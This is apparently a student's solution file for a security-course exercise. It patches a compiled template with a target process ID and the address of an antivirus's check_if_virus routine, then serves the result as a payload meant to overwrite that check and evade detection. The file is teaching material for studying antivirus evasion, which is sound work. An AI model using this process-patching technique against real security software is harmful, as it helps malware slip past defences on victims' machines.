import addresses
import evasion
import struct

from infosec.core import assemble


class SolutionServer(evasion.EvadeAntivirusServer):

    def get_payload(self, pid: int) -> bytes:
        """Returns a payload to replace the check_if_virus code.

        Notes:
        1. You can assume we already compiled q2.c into q2.template.
        2. Use addresses.CHECK_IF_VIRUS_CODE (and addresses.address_to_bytes).
        3. If needed, you can use infosec.core.assemble.

        Returns:
             The bytes of the payload.
        """
        PATH_TO_TEMPLATE = './q2.template'
        with open(PATH_TO_TEMPLATE, 'rb') as reader:
            data = reader.read()

        addr_index = data.find(b'\x22\x22\x11\x11')
        pid_index = data.find(b'\x78\x56\x34\x12')

        addr_bytes = bytearray(addresses.address_to_bytes(addresses.CHECK_IF_VIRUS_CODE))
        pid_bytes = bytearray(struct.pack('<L', pid))
        data = bytearray(data)

        for i in range(4):
            data[addr_index + i] = addr_bytes[i]
            data[pid_index + i] = pid_bytes[i]
        
        return bytes(data)

    def print_handler(self, product: bytes):
        # WARNING: DON'T EDIT THIS FUNCTION!
        print(product.decode('latin-1'))

    def evade_antivirus(self, pid: int):
        # WARNING: DON'T EDIT THIS FUNCTION!
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)
